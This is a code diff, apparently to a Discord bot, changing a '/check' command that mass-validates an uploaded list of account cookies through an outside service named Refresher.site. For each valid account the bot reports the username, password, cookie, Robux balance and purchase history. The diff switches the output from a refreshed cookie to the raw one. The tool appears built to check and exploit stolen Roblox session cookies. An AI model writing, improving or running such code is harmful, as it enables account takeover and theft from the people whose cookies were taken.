@@ -37,7 +37,7 @@ function extractCookies(text: string): string[] {
 
 const data = new SlashCommandBuilder()
   .setName('check')
-  .setDescription('Mass Checking File (Auto‑Refresh via Refresher.site)')
+  .setDescription('Mass Checking File (Refresher.site)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
   ) as SlashCommandBuilder;
@@ -124,7 +124,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         }
 
         const account: any = resp.data.account_info;
-        const newCookie = resp.data.new_cookie || rawCookie;
         validCount++;
 
         const username = account.username || 'Unknown';
@@ -146,7 +145,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         const continuePlaying: any[] = account.continue_playing || [];
         const purchaseCount = continuePlaying.reduce((acc: number, g: any) => acc + (g.purchaseCount || 0), 0);
         const robuxSpent = continuePlaying.reduce((acc: number, g: any) => acc + (g.robuxSpent || 0), 0);
-        // Count gamepass purchases
         let gamepassCount = 0;
         for (const g of continuePlaying) {
           const purchases: any[] = g.purchases || [];
@@ -168,9 +166,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         totalGamepasses += gamepassCount;
         if (premium === 'Yes') totalPremium++;
 
-        // DM embed
+        // DM embed with original cookie (no new_cookie)
         const embed = buildSuccessEmbed(
-          `\`\`\`\n${newCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
+          `\`\`\`\n${rawCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
         );
         if (account.avatarUrl) embed.setThumbnail(account.avatarUrl);
 
@@ -185,7 +183,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         outputLines.push(`Username: ${username}`);
         outputLines.push(`Password: ${password}`);
         outputLines.push(`UserID: ${userId}`);
-        outputLines.push(`Cookie: ${newCookie}`);
+        outputLines.push(`Cookie: ${rawCookie}`);
         outputLines.push(`Robux: ${robux}`);
         outputLines.push(`Pending: ${pending}`);
         outputLines.push(`Roblox Credit: ${credit}`);
@@ -230,10 +228,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     );
 
     try {
-      await interaction.user.send({
-        embeds: [summaryEmbed],
-        files: [fileAttachment],
-      });
+      await interaction.user.send({ embeds: [summaryEmbed], files: [fileAttachment] });
     } catch {
       const chan = interaction.channel as any;
       if (chan && chan.send) await chan.send({ embeds: [summaryEmbed], files: [fileAttachment] });
